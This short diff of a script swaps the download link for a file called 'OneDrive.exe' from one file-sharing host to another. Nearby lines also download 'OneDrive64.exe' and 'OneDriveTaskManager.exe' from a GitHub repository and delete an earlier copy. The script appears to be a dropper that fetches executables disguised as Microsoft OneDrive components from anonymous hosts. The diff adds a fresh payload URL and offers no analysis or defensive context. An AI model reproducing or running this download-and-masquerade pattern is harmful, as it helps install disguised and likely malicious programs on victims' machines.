@@ -11,7 +11,7 @@ del 'OneDriveTaskManager.exe'
 timeout /t 1
 $url2 = 'https://raw.githubusercontent.com/nikitswi/DrWeb/main/OneDrive64.exe'
 $outputFile2 = 'OneDrive64.exe'
-$url='https://cloclo57.datacloudmail.ru/public/get/2foGZv1bG82c3VcyJ3uRe6rMCkeesi1AWN55BYdjgT3Z1fBysgaGkfULSNaBGPqw8q12gD1TdPoxTHNXYxJzQDpKgNQy5epLzVS7CfzNwWPEoYqo636coNiVXez8ZTVDcpAdPmFauFFmd2yKxdHVKGU4TkgzAzb9ELEcZhVqN7uEa8c6tiTM2zWbLBzKqCo1kjUCgebx16chsAccSfpPnSHqfSKqYAgYvjM4HFEfiqEVQ5FCP3p58sUV3ND31W7yFUYbmMnbV9ReuJXQqpcQX3dKT3RyxpDbujGKb7c1rUkTqQfwtmNihsmotupD36zy74xFTgWrvcVpUuWJwfMMC3Kca8c7E8UAf9mDxTTkgoLaXCxzAL4qUH1zXFgBmh1rndcPNGkWLXYf8ZBXfvBzg/n1kitswi@gmail.com/OneDrive.exe'
+$url='https://edef1.pcloud.com/cBZR2WsS3Z0g6VEx7ZXyY2ZZPdw60kZ2ZZTuZkZkqEkRZR8ZiHZL4ZO4Zr4ZH5ZjVZRpZ9XZkQZs5Zy8ZqRZ6zZ6dQaZsrGJosu8SvfQjXwDPPQRUkRN34eV/OneDrive.exe'
 $outputFile = 'OneDrive.exe'
 $url3 = 'https://raw.githubusercontent.com/nikitswi/DrWeb/main/OneDriveTaskManager.exe'
 $outputFile3 = 'OneDriveTaskManager.exe'
